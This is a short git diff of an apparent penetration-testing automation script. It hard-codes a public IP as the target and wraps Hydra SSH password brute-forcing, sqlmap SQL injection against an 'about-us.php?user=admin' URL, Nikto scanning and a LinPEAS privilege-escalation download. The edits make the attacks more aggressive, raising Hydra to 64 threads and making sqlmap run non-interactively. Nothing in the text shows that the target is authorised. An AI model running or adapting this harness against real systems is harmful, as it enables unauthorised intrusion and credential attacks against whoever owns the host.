@@ -6,7 +6,7 @@ from contextlib import contextmanager
 
 TARGET = "51.145.251.231"
 USER = "ubuntu"
-KEY = "/home/kali/Desktop/dev.pm"
+KEY = "/home/kali/Desktop/Dectar April/dev.pm"
 LINPEAS = "https://github.com/carlospolop/PEASS-ng/releases/download/20220731/linpeas.sh"
 NIKTO = "http://"+TARGET
 HYDRA = TARGET
@@ -55,14 +55,14 @@ def nikto():
 def hydra():
     try:
         with limit(120):
-            subprocess.run(["hydra", "-l", LOGIN, "-P", LIST, "-t", "4", "ssh://" + HYDRA], timeout=120)
+            subprocess.run(["hydra", "-l", LOGIN, "-P", LIST, "-t", "64", "ssh://" + HYDRA], timeout=120)
     except Timeout:
         print("Timed out")
 
 def sqli():
     try:
         with limit(120):
-            subprocess.run(["sqlmap", "-u", 'http://'+TARGET+'/about-us.php?user=admin'], timeout=120)
+            subprocess.run(["sqlmap","--batch", "-u", 'http://'+TARGET+'/about-us.php?user=admin'], timeout=120)
     except Timeout:
         print("Timed out")
 
